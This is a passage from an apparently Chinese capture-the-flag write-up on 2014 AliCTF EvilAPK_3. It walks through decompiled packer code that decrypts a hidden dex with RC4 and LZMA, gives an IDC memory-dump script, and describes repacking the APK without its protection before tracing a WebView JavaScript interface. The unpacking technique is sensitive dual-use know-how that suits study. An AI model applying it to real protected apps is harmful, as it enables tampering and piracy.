v20; // r5  unsigned __int8 *v21; // r8  const char *v22; // r3  char *v23; // r0  char *v24; // r0  char *v25; // r6  ali::EncFile *v26; // r7  int v27; // r0  int *v28; // r0  char *v29; // r0  int v30; // r10  void *v31; // r7  int (__fastcall *v32)(unsigned __int8 *, int, signed int *); // r9  int (__fastcall *v33)(_DWORD); // r7  const char *v34; // r2  int v35; // r9  signed int v36; // r7  _DWORD *v37; // r9  _BYTE *v38; // r5  unsigned __int8 *v39; // r3  void *v40; // r0  JNINativeMethod *v41; // r0  unsigned __int8 *v42; // r3  signed int v43; // r3  _JNIEnv *v45; // [sp+8h] [bp-2A0h]  __int64 *v46; // [sp+10h] [bp-298h]  int v47; // [sp+24h] [bp-284h]  unsigned __int8 *v48; // [sp+28h] [bp-280h]  unsigned __int8 *v49; // [sp+2Ch] [bp-27Ch]  void (__cdecl *v50)(const unsigned int *, jvalue *); // [sp+30h] [bp-278h]  char v51; // [sp+34h] [bp-274h]  signed int v52[2]; // [sp+38h] [bp-270h]  char s; // [sp+40h] [bp-268h]  char v54; // [sp+54h] [bp-254h]  int v55; // [sp+64h] [bp-244h]  int v56; // [sp+68h] [bp-240h]  char v57; // [sp+6Ch] [bp-23Ch]  const char *v58; // [sp+80h] [bp-228h]  char v59; // [sp+84h] [bp-224h]  const char *v60; // [sp+98h] [bp-210h]  char v61; // [sp+9Ch] [bp-20Ch]  unsigned int v62; // [sp+B0h] [bp-1F8h]  char v63; // [sp+B4h] [bp-1F4h]  char v64; // [sp+CCh] [bp-1DCh]  int v65; // [sp+E0h] [bp-1C8h]  char v66; // [sp+E4h] [bp-1C4h]  char v67; // [sp+FCh] [bp-1ACh]  const char *v68; // [sp+110h] [bp-198h]  char v69; // [sp+114h] [bp-194h]  char v70; // [sp+12Ch] [bp-17Ch]  const char *v71; // [sp+140h] [bp-168h]  char v72; // [sp+144h] [bp-164h]  char *v73; // [sp+154h] [bp-154h]  char *v74; // [sp+158h] [bp-150h]  char v75; // [sp+15Ch] [bp-14Ch]  char v76; // [sp+174h] [bp-134h]  char v77; // [sp+18Ch] [bp-11Ch]  char v78; // [sp+1A4h] [bp-104h]  char v79; // [sp+1BCh] [bp-ECh]  char v80; // [sp+1D4h] [bp-D4h]  char v81; // [sp+1ECh] [bp-BCh]  char v82; // [sp+204h] [bp-A4h]  char v83; // [sp+21Ch] [bp-8Ch]  char v84; // [sp+234h] [bp-74h]  int v85; // [sp+244h] [bp-64h]  unsigned __int8 *v86; // [sp+248h] [bp-60h]  char v87; // [sp+24Ch] [bp-5Ch]  char v88; // [sp+264h] [bp-44h]  char *v89; // [sp+274h] [bp-34h]  char *v90; // [sp+278h] [bp-30h]  v45 = a1;  v46 = a2;  _android_log_print(3, &quot;debug&quot;, &quot;enter parse_dex&quot;);  if ( ali::isDalvik )                          // dalvik or art  {    v47 = 0;    std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v88, &amp;ali::g_filePath, &quot;/cls.jar&quot;);// locate cls.jar    v25 = v90;    v26 = (ali::EncFile *)operator new(0xCu);    ali::EncFile::EncFile(v26, v25);    v48 = 0;    v49 = 0;    if ( ali::sdk_int &gt; 13 )                    // sdk version &gt; 13    {      v27 = ali::EncFile::openWithHeader(v26, &amp;v48, (unsigned int *)&amp;v47, 0x10u);      v49 = v48 + 16;    }    else                                        // sdk version &lt;= 13 ( android 3.x )    {      v27 = ali::EncFile::open(v26, &amp;v49, (unsigned int *)&amp;v47);    }    if ( v49 == (unsigned __int8 *)-1 )    {      v28 = (int *)_errno(v27);      v29 = strerror(*v28);      _android_log_print(3, &quot;debug&quot;, &quot;mmap dex file :%s&quot;, v29);LABEL_45:      v24 = &amp;v88;      goto LABEL_46;    }    v30 = *((_DWORD *)v49 + 8);    if ( ali::sdk_int &gt; 13 )                    // sdk version &gt; 13    {      v40 = dlopen(&quot;libdvm.so&quot;, 1);             // open libdvm.so and start execute program      v41 = (JNINativeMethod *)dlsym(v40, &quot;dvm_dalvik_system_DexFile&quot;);      v50 = 0;      lookup(v41, &quot;openDexFile&quot;, &quot;([B)I&quot;, &amp;v50);      v42 = v48;      *((_DWORD *)v48 + 2) = v47;      *(_DWORD *)&amp;v51 = v42;      ((void (*)(void))v50)();      v43 = v52[0];      *v46 = v52[0];      *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v43 + 8) + 4) + 32) = *(_DWORD *)(v43 + 16);      *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v43 + 8) + 4) + 36) = v47;      ali::EncFile::~EncFile(v26);      operator delete((void *)v26);    }    else                                        // sdk version &lt;= 13 ( android 3.x )    {      v31 = dlopen(&quot;libdvm.so&quot;, 1);      v32 = (int (__fastcall *)(unsigned __int8 *, int, signed int *))dlsym(v31, &quot;dvmDexFileOpenPartial&quot;);      v33 = (int (__fastcall *)(_DWORD))dlsym(v31, &quot;dexCreateClassLookup&quot;);      v52[0] = 0;      if ( v32(v49, v30, v52) == -1 )      {        v34 = &quot;dvmDexFileOpenPartial error&quot;;LABEL_40:        _android_log_print(3, &quot;debug&quot;, v34);        goto LABEL_45;      }      v35 = *(_DWORD *)v52[0];      *(_DWORD *)(v35 + 36) = v33(*(_DWORD *)v52[0]);      v36 = v52[0];      if ( !*(_DWORD *)(*(_DWORD *)v52[0] + 36) )      {        v34 = &quot;dexCreateClassLookup error&quot;;        goto LABEL_40;      }      v37 = malloc(0x2Cu);      v38 = malloc(0x14u);      strdup((const char *)&amp;unk_4CEE9);      v38[4] = 0;      v38[5] = 0;      *((_DWORD *)v38 + 2) = 0;      v39 = v49;      *(_DWORD *)v38 = v38;      *((_DWORD *)v38 + 3) = v37;      v37[10] = v36;      *(_DWORD *)(v36 + 32) = v39;      *(_DWORD *)(v36 + 36) = v47;      *v46 = (signed int)v38;    }    v23 = &amp;v88;    goto LABEL_44;  }  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v54, &amp;ali::g_filePath, &quot;/cls.jar&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v57, &amp;ali::g_filePath, &quot;/cls.dex&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v59, &amp;ali::g_filePath, &quot;/fak.jar&quot;);  _android_log_print(3, &quot;debug&quot;, &quot;before oat gen&quot;);  if ( !access(v58, 0) )    goto LABEL_24;  v2 = android_getCpuFamily();  std::string::string(&amp;v63, &quot;arm&quot;, &amp;v51);  switch ( v2 )  {    case 1:      v3 = &quot;arm&quot;;LABEL_5:      std::string::operator=(&amp;v63, v3);      break;    case 2:      v3 = &quot;x86&quot;;      goto LABEL_5;    case 3:    case 6:      v3 = &quot;mips&quot;;      goto LABEL_5;    case 4:      v3 = &quot;arm64&quot;;      goto LABEL_5;    case 5:      v3 = &quot;x86_64&quot;;      goto LABEL_5;  }  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v64, &amp;ali::g_libPath, &quot;/libhack.so&quot;);  v4 = getenv(&quot;LD_PRELOAD&quot;);  v5 = v4;  if ( v4 )  {    _android_log_print(3, &quot;debug&quot;, &quot;the system already define LD_PRELOAD=%s&quot;, v4);    std::string::string(&amp;v84, v5, v52);    v6 = v86;    v7 = v85;    while ( v6 != (unsigned __int8 *)v7 )    {      v8 = *v6++;      if ( v8 == 32 )        *(v6 - 1) = 58;    }    std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v87, &amp;v84, &quot;:&quot;);    std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v88, &amp;v87, &amp;v64);    std::string::_M_assign((std::string *)&amp;v64, v90, v89);    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v88);    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v87);    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v84);  }  _android_log_print(3, &quot;debug&quot;, &quot;the new LD_PRELOAD is %s&quot;, v65);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v66, &amp;ali::g_filePath, &quot;/juice.data&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v67, &amp;ali::g_filePath, &quot;/fak.jar&quot;);  fd = open(v68, 0);  memset(&amp;s, 0, 0x14u);  sprintf(&amp;s, &quot;%d&quot;, fd);  std::string::string(&amp;v69, &amp;s, v52);  v73 = &amp;v72;  v74 = &amp;v72;  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_allocate_block(&amp;v72, v55 - v56 + 10);  *v73 = 0;  std::string::_M_appendT&lt;char const*&gt;(&amp;v72, &quot;DEX_FILE=&quot;, &quot;&quot;, v52);  std::string::append((std::string *)&amp;v72, (const std::string *)&amp;v54);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v75, &amp;v72, &quot;                     JUICE_FILE=&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v76, &amp;v75, &amp;v66);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v77, &amp;v76, &quot;                     LD_PRELOAD=&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v78, &amp;v77, &amp;v64);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(    &amp;v79,    &amp;v78,    &quot;                     /system/bin/dex2oat \t\t\t\t  \t --runtime-arg -Xms64m \t\t\t\t\t --runtime-arg -Xmx64m \t\t\t\t&quot;    &quot;\t --boot-image=/system/framework/boot.art                      --zip-fd=&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v80, &amp;v79, &amp;v69);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v81, &amp;v80, &quot;\t\t\t\t\t --zip-location=&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v82, &amp;v81, &amp;v67);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v83, &amp;v82, &quot;\t\t\t\t\t --oat-file=&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v84, &amp;v83, &amp;v57);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v70, &amp;v84, &quot;                     &quot;);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v84);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v83);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v82);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v81);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v80);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v79);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v78);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v77);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v76);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v75);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v72);  _android_log_print(3, &quot;debug&quot;, &quot;cmd is %s&quot;, v71);  system(v71);  close(fd);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v70);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v69);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v67);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v66);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v64);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v63);LABEL_24:  _android_log_print(3, &quot;debug&quot;, &quot;after oat gen&quot;);  v10 = ali::JDexFile;  v11 = dword_54140;  if ( ali::sdk_int &lt;= 19 )                     // sdk version &lt;= 19  {    v12 = _JNIEnv::NewStringUTF(v45, v60);    v13 = _JNIEnv::NewStringUTF(v45, v58);    v16 = _JNIEnv::CallStaticIntMethod(v45, v10, v11, v12, v13, 0);    v18 = 0;  }  else                                          // sdk version &gt; 19  {    v14 = _JNIEnv::NewStringUTF(v45, v60);    v15 = _JNIEnv::NewStringUTF(v45, v58);    v16 = _JNIEnv::CallStaticLongMethod(v45, v10, v11, v14, v15, 0);    v18 = v17;  }  _android_log_print(3, &quot;debug&quot;, &quot;cookie is %llx&quot;);  *(_DWORD *)v46 = v16;  *((_DWORD *)v46 + 1) = v18;  v19 = (int (__fastcall *)(int, signed int))dlsym((void *)0xFFFFFFFF, &quot;_ZNK3art7DexFile12FindClassDefEt&quot;);  _android_log_print(3, &quot;debug&quot;, &quot;DexFile::FindClassDefFn is %p&quot;, v19);  v20 = v19(v16, 1);  _android_log_print(3, &quot;debug&quot;, &quot;call FindClassDefFn(%p,%d) =&gt; %p&quot;, v16, 1, v20);  _android_log_print(3, &quot;debug&quot;, &quot;dex position is %p&quot;, v20 - 572);  _android_log_print(3, &quot;debug&quot;, &quot;dex head is %08x %08x&quot;, *(_DWORD *)(v20 - 572), *(_DWORD *)(v20 - 568));  v21 = *(unsigned __int8 **)(v20 - 540);  _android_log_print(3, &quot;debug&quot;, &quot;dex size is %d&quot;, v21);  MemEnableWrite((unsigned __int8 *)(v20 - 572), &amp;v21[v20 - 572]);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v61, &amp;ali::g_filePath, &quot;/juice.data&quot;);  if ( !ali::dex_juicer_patch((ali *)(v20 - 572), v21, v62, v22) )  {    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v61);    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v59);    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v57);    v23 = &amp;v54;LABEL_44:    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(v23);    _android_log_print(3, &quot;debug&quot;, &quot;exit parse_dex&quot;);    return 0;  }  _android_log_print(6, &quot;debug&quot;, &quot;fail to patch dex&quot;);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v61);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v59);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v57);  v24 = &amp;v54;LABEL_46:  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(v24);  _android_log_print(3, &quot;debug&quot;, &quot;exit parse_dex error&quot;);  return -1;}</code></pre><p>在 openWithHeader 中，log 了三次 dex 的 magic number，中间分别进行了 RC4 解密和 LZMA 解压缩。最后得到的结果应该就是最终的 dex 文件：</p><pre><code class="cpp">int __fastcall ali::EncFile::openWithHeader(ali::EncFile *this, unsigned __int8 **a2, unsigned int *a3, unsigned int a4){  ali::EncFile *v4; // r5  unsigned __int8 **v5; // r11  unsigned int *v6; // r6  unsigned int v7; // r7  const char *v8; // r2  int fd; // r8  int v10; // r10  __blksize_t v12; // r3  unsigned __int8 *v13; // r4  ali *v14; // r0  __int64 v15; // r0  __int64 v16; // ST18_8  unsigned int *v17; // r3  ali *v18; // r0  __int64 v19; // r0  int v20; // r8  int v21; // r3  char v22; // r2  unsigned __int64 v23; // r0  ali *v24; // r0  unsigned __int8 *v25; // r9  ali *v26; // ST24_4  __int64 v27; // r0  __int64 v28; // ST18_8  ali *v29; // r0  __int64 v30; // r0  size_t v31; // [sp+2Ch] [bp-9Ch]  int v32; // [sp+30h] [bp-98h]  char v33; // [sp+34h] [bp-94h]  struct stat buf; // [sp+38h] [bp-90h]  v4 = this;  v5 = a2;  v6 = a3;  v7 = a4;  if ( !*((_DWORD *)this + 2) )  {    v8 = &quot;file path is null&quot;;LABEL_5:    _android_log_print(6, &quot;debug&quot;, v8);    return 0;  }  fd = open(*((const char **)this + 2), 0);  v10 = fstat(fd, &amp;buf);  if ( v10 )  {    v8 = &quot;fstat failed&quot;;    goto LABEL_5;  }  v12 = buf.st_blksize;  *v6 = buf.st_blksize;  *(_DWORD *)v4 = v12;  v13 = (unsigned __int8 *)mmap(0, *v6, 3, 2, fd, 0);  *((_DWORD *)v4 + 1) = v13;  close(fd);  v14 = (ali *)_android_log_print(                 3,                 &quot;debug&quot;,                 &quot;dex magic %c %c %c %c %c %c %c&quot;,// original dex magic                 *v13,                 v13[1],                 v13[2],                 v13[3],                 v13[4],                 v13[5],                 v13[6]);  LODWORD(v15) = ali::NanoTime(v14);  v16 = v15;  v18 = (ali *)ali::decryptRc4((ali *)v13, v13, (unsigned __int8 *)v6, v17);// RC4 decrypt  LODWORD(v19) = ali::NanoTime(v18);  ali::PrettyDuration((ali *)(v19 - v16), v19 - v16);  _android_log_print(3, &quot;debug&quot;, &quot;decrypted len:%u&quot;, *v6);  v20 = 0;  _android_log_print(    3,    &quot;debug&quot;,    &quot;after decrypt dex magic %c %c %c %c %c %c %c&quot;,// dex magic after RC4    *v13,    v13[1],    v13[2],    v13[3],    v13[4],    v13[5],    v13[6]);  v21 = (int)(v13 + 4);  do  {    v22 = 8 * v10++;    v23 = (unsigned __int64)*(unsigned __int8 *)(v21++ + 1) &lt;&lt; v22;    v20 += v23;  }  while ( v10 != 8 );  _android_log_print(3, &quot;debug&quot;, &quot;unpackSize: %u&quot;, v20);  *(_DWORD *)v4 = v7 + v20;  v24 = (ali *)mmap(0, v7 + v20, 3, 34, -1, 0);  *((_DWORD *)v4 + 1) = v24;  v25 = (unsigned __int8 *)v24 + v7;  v26 = v24;  LODWORD(v27) = ali::NanoTime(v24);  v31 = *v6;  v28 = v27;  v32 = v20;  v29 = (ali *)LzmaDecode(v25, &amp;v32, v13 + 13, &amp;v31, v13, 5, 1, &amp;v33, &amp;off_54028);// LZMA uncompress  LODWORD(v30) = ali::NanoTime(v29);  ali::PrettyDuration((ali *)(v30 - v28), v30 - v28);  munmap(v13, buf.st_blksize);  _android_log_print(    3,    &quot;debug&quot;,    &quot;after uncompressed dex magic %c %c %c %c %c %c %c&quot;,// dex magic after LZMA    *((unsigned __int8 *)v26 + v7),    v25[1],    v25[2],    v25[3],    v25[4],    v25[5],    v25[6]);  *v6 = v20;  if ( v5 )    *v5 = (unsigned __int8 *)*((_DWORD *)v4 + 1);  return *((_DWORD *)v4 + 1);}</code></pre><h1 id="Dump-Dex-File"><a href="#Dump-Dex-File" class="headerlink" title="Dump Dex File"></a>Dump Dex File</h1><p>知道了解析 dex 的流程，接下来就通过动态调试来吧 dex 文件 dump 下来。现在 BL 跳转到 openWithHeader 的语句处设下断点：</p><pre><code>.text:00026A7E loc_26A7E                               ; CODE XREF: parse_dex(_JNIEnv *,long long *)+622↑j.text:00026A7E                 MOV             R1, R9  ; unsigned __int8 **.text:00026A80                 MOV             R2, R4  ; unsigned int *.text:00026A82                 MOVS            R3, #0x10 ; unsigned int.text:00026A84                 BL              _ZN3ali7EncFile14openWithHeaderEPPhPjj ; ali::EncFile::openWithHeader(uchar **,uint *,uint).text:00026A88                 LDR.W           R3, [R9].text:00026A8C                 ADDS            R3, #0x10.text:00026A8E                 STR             R3, [R6]</code></pre><p>运行到断点处，单步步入 openWithHeader 函数，然后单步步过一直到 return，中间可以在 monitor 中用 tag:debug 过滤来查看 log。运行完后看到 log 输出的 magic number 已经是真实 dex 文件的样子了：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/1.png" srcset="/img/loading.gif" alt></p><p>根据函数的返回值存放在 R0 中，可以看到 R0 所指向的部分是一个 dex 文件的数据了：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/2.png" srcset="/img/loading.gif" alt></p><p>接下来我们可以把 dex 文件给 dump 下来。但文件的大小为多少？根据 dex 的数据结构，可以知道 dex 文件的大小位于偏移 0x20 处：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/3.png" srcset="/img/loading.gif" alt></p><p>接下来使用 IDC 脚本来 dump 数据：</p><pre><code class="cpp">static main(void) {    auto fp, begin, end, len, b;    fp = fopen(&quot;dump.dex&quot;, &quot;wb&quot;);    begin = 0x7584C010; // 解密后数据在内存中的位置    len = 0x0941FC; // 文件大小    end = begin + len;    for (b = begin; b &lt; end; b++) {        fputc(Byte(b), fp);    }}</code></pre><p>最后将 dump 下来的数据放进 JEB 中，反汇编可以得到真实的 MainActivity 代码：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/4.png" srcset="/img/loading.gif" alt></p><h1 id="Fix-Application"><a href="#Fix-Application" class="headerlink" title="Fix Application"></a>Fix Application</h1><p>使用 AndroidKiller 反编译加固后的 apk，找到 AndroidManifest.xml，删除 Application 的 android:name 属性：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;no&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.ali.tg.testapp&quot; platformBuildVersionCode=&quot;23&quot; platformBuildVersionName=&quot;6.0-2438415&quot;&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt;    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;    &lt;application android:allowBackup=&quot;true&quot; android:debuggable=&quot;true&quot; android:icon=&quot;@drawable/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:theme=&quot;@style/AppTheme&quot;&gt;        &lt;activity android:label=&quot;@string/app_name&quot; android:name=&quot;.MainActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;        &lt;activity android:name=&quot;.WebViewActivity&quot;/&gt;    &lt;/application&gt;&lt;/manifest&gt;</code></pre><p>回编译后，找到生成的 apk，压缩软件打开，替换我们 dump 出来的 classes.dex，同时删除 assets 文件夹，其他 so 文件不用管。修改完后重新签名打包并安装运行，可以正常使用。</p><h1 id="Find-Flag"><a href="#Find-Flag" class="headerlink" title="Find Flag"></a>Find Flag</h1><p>定位到真实的程序后，开始分析具体的内容。先来看 MainActivity，主要是一个点击事件，其中获取了 EditText 中的字符串并作为参数传入并启动 WebViewActivity：</p><pre><code class="java">package com.ali.tg.testapp;import android.app.Activity;import android.content.Intent;import android.os.Bundle;import android.support.v4.app.ActionBarDrawerToggleJellybeanMR2n;import android.support.v4.widget.ListViewAutoScrollHelpern;import android.view.View$OnClickListener;import android.view.View;import android.widget.Button;import android.widget.EditText;public class MainActivity extends Activity {    class com.ali.tg.testapp.MainActivity$1 implements View$OnClickListener {        com.ali.tg.testapp.MainActivity$1(MainActivity arg1) {            MainActivity.this = arg1;            super();        }        public void onClick(View arg6) {            ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a());            String v1 = MainActivity.this.edit.getText().toString(); // 获取EditText中的字符串            Intent v0 = new Intent();            v0.putExtra(ListViewAutoScrollHelpern.decrypt_native(&quot;dV.&quot;, 2), v1); // 将v1的值传给Intent，变量名为“dV.”解密后的值            v0.setClass(MainActivity.this, WebViewActivity.class); // 设置Intent要跳转的类为WebViewActivity            MainActivity.this.startActivity(v0); // 启动WebViewActivity        }    }    Button btn_enter;    View$OnClickListener btn_listener;    EditText edit;    public MainActivity() {        super();        this.btn_enter = null;        this.edit = null;        this.btn_listener = new com.ali.tg.testapp.MainActivity$1(this);    }    protected void onCreate(Bundle arg4) {        ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a());        super.onCreate(arg4);        this.setContentView(0x7F030000);        this.edit = this.findViewById(0x7F060001);        this.btn_enter = this.findViewById(0x7F060002);        this.btn_enter.setOnClickListener(this.btn_listener);    }}</code></pre><p>然后来看看 WebViewActivity，主要就是新建了一个 JavaScriptInterface 对象，对象的名称同样被加密了。然后加载输入的 url，目标是最后能够成功调用对象 JavaScriptInterface 里的 showToast 方法。接下来需要根据密文解出对象名，并构造出相应的网页来弹出 Toast。不过这里好像 flag 就是“祥龙”，但还是继续往下尝试构造出能够弹 Toast 的方法：</p><pre><code class="java">package com.ali.tg.testapp;import android.app.Activity;import android.content.Context;import android.os.Bundle;import android.support.v4.app.ActionBarDrawerToggleJellybeanMR2n;import android.support.v4.widget.ListViewAutoScrollHelpern;import android.webkit.WebSettings;import android.webkit.WebView;import android.widget.Toast;public class WebViewActivity extends Activity {    public class JavaScriptInterface {        Context mContext;        JavaScriptInterface(WebViewActivity arg1, Context arg2) {            WebViewActivity.this = arg1;            super();            this.mContext = arg2;        }        public void showToast() { // 构造出一个页面能够调用这个函数就成功了            ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a());            Toast.makeText(this.mContext, &quot;祥龙！&quot;, 0).show();        }    }    WebView wView;    public WebViewActivity() {        super();        this.wView = null;    }    protected void onCreate(Bundle arg7) {        ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a());        super.onCreate(arg7);        this.setContentView(0x7F030001);        this.wView = this.findViewById(0x7F060004);        WebSettings v2 = this.wView.getSettings();        v2.setJavaScriptEnabled(true);        v2.setJavaScriptCanOpenWindowsAutomatically(true);        this.wView.addJavascriptInterface(new JavaScriptInterface(this, ((Context)this)), ListViewAutoScrollHelpern.decrypt_native(&quot;BQ1$*[w6G_&quot;, 2)); // 添加一个JavascriptInterface对象，对象的变量名为“BQ1$*[w6G_”解密后的值        this.wView.loadUrl(this.getIntent().getStringExtra(ListViewAutoScrollHelpern.decrypt_native(&quot;dV.&quot;, 2))); // 把在MainActivity中获取的变量作为url来加载    }}</code></pre><h1 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h1><p>接下来再看看 ListViewAutoScrollHelpern 中的 decrypt_native 方法，发现是在 Native 层中的 translate 库实现的：</p><pre><code class="java">package android.support.v4.widget;import android.util.Log;public class ListViewAutoScrollHelpern {    static {        System.loadLibrary(&quot;translate&quot;);    }    public ListViewAutoScrollHelpern() {        super();    }    public static native String decrypt_native(String arg0, int arg1) {    }    public static void testLogv(String arg1) {        Log.v(&quot;cheatecore&quot;, arg1);    }    public static void testLogw(String arg1) {        Log.w(&quot;cheatecore&quot;, arg1);    }}</code></pre><p>然后将 libtranslat.so 载入 IDA。先看看 JNI_OnLoad，其中有两个函数 register_Algorithm 和 register_translate：</p><pre><code class="cpp">int __fastcall JNI_OnLoad(_JavaVM *a1){  int v1; // r1  jint v2; // r2  _JNIEnv *v3; // r4  jint v4; // r0  bool v5; // cf  int result; // r0  _JNIEnv *env; // [sp+4h] [bp-Ch]  env = 0;  if ( a1-&gt;functions-&gt;GetEnv(&amp;a1-&gt;functions, (void **)&amp;env, 65540) )    return -1;  v3 = env;  register_Algorithm(env, v1, v2);  v4 = register_translate(v3);  v5 = v4 &lt; 0;  result = v4 &amp; (v4 &gt;&gt; 32);  if ( !v5 )    result = 65540;  return result;}</code></pre><p>在 register_Algorithm 中发现了目标函数：</p><pre><code class="cpp">int __fastcall register_Algorithm(_JNIEnv *a1, int a2, jint a3){  _JNIEnv *v3; // r4  jclass v4; // r0  jclass v5; // r0  v3 = a1;  v4 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, &quot;android/support/v4/widget/ListViewAutoScrollHelpern&quot;);  v3-&gt;functions-&gt;RegisterNatives(&amp;v3-&gt;functions, v4, (const JNINativeMethod *)off_607C, 1);  v5 = v3-&gt;functions-&gt;FindClass(&amp;v3-&gt;functions, &quot;android/support/v4/view/PagerTitleStripIcsn&quot;);  v3-&gt;functions-&gt;RegisterNatives(&amp;v3-&gt;functions, v5, (const JNINativeMethod *)off_607C, 1);  return 0;}</code></pre><p>定位到目标函数，发现其中调用了一个 vigenere_decrypt：</p><pre><code class="cpp">jstring __fastcall decrypt_native(_JNIEnv *a1, jobject a2, jstring a3, jint a4){  jstring data; // r6  jint num; // r9  _JNIEnv *env; // r4  const char *v7; // r0  const char *v8; // r8  jstring v9; // r7  int v11; // [sp+4h] [bp+0h]  data = a3;  num = a4;  env = a1;  memset(&amp;v11, 0, 0x1000u);  v7 = env-&gt;functions-&gt;GetStringUTFChars(&amp;env-&gt;functions, data, 0);  v8 = v7;  if ( num == 2 )  {    vigenere_decrypt(v7, (char *)&amp;v11);    v9 = 